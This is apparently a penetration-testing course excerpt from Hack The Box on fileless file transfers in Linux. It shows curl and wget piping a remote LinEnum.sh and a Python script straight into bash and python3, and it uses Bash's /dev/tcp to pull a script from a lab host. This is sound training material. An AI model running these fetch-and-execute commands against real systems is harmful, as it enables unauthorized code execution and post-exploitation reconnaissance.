## Fileless Attacks Using Linux

Because of the way Linux works and how [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

**Note:** Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.

Let's take the `cURL` command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.
#### Fileless Download with cURL
```shell-session
pepedavidphone@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using `wget`.

#### Fileless Download with wget
```shell-session
pepedavidphone@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World
```

## Download with Bash (/dev/tcp)
There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

#### Connect to the Target Webserver

```shell-session
pepedavidphone@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

#### HTTP GET Request

```shell-session
pepedavidphone@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Print the Response

```shell-session
pepedavidphone@htb[/htb]$ cat <&3
```